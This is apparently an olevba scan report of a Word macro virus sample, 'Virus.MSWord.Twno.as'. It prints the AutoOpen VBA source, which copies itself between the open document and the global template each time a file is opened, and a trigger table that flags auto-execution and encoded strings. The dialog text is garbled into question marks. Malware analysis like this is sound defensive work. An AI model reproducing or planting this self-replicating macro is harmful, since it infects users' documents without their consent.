olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twno.as
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twno.as - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Twno.as - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim thishour
Dim thishuor
Dim dlg As Object
Dim nor
Dim kk
Dim t
Dim file$
Dim filem$
Dim nor1
Dim kkk
Dim tt
thishour = WordBasic.Hour(WordBasic.Now())
If thishuor = 20 Then
    
        WordBasic.Text 61, 28, 101, 13, "??????!??????!????????!", "Text2"
        WordBasic.Text 21, 48, 171, 13, "????,????????????????!", "Text3"
        WordBasic.TextBox 54, 90, 239, 18, "WMH"
        WordBasic.OKButton 95, 112, 88, 21
    WordBasic.EndDialog
    Set dlg = WordBasic.CurValues.UserDialog
    WordBasic.Dialog.UserDialog dlg
    
    If dlg.wmh <> "??????!??????!????????!" And dlg.wmh <> "wmh" Then
        WordBasic.MsgBox "????????,????????????????????????????....", "????!", 48
        WordBasic.Dialog.UserDialog dlg
    Else
        WordBasic.MsgBox "????,??????,????....", "????!", 48
        GoTo eeend
    End If
    If dlg.wmh = "??????!??????!????????!" Or dlg.wmh = "wmh" Then
        WordBasic.MsgBox "????,??????,????....", "????!", 48
    Else
        WordBasic.MsgBox "??????....??????", "????!", 48
    End If
eeend:
End If
'   file$ = FileName$()
'   filem$ = file$ + ":AutoOpen"
'   MacroCopy filem$, "AutoOpen"

nor = WordBasic.CountMacros(0)
If nor > 0 Then
    For kk = 1 To nor
        If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
        t = 1
        End If
        Next kk
        
End If

file$ = WordBasic.[FileName$]()
filem$ = file$ + ":AutoOpen"
If t <> 1 Then
    WordBasic.MacroCopy filem$, "AutoOpen"
End If

nor1 = WordBasic.CountMacros(1)
If nor1 > 0 Then
    For kkk = 1 To nor1
        If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
        tt = 1
        End If
        Next kkk
        
End If

If tt <> 1 Then
    WordBasic.FileSaveAs Format:=1
    On Error Resume Next
    WordBasic.MacroCopy "AutoOpen", filem$
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Twno.as - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

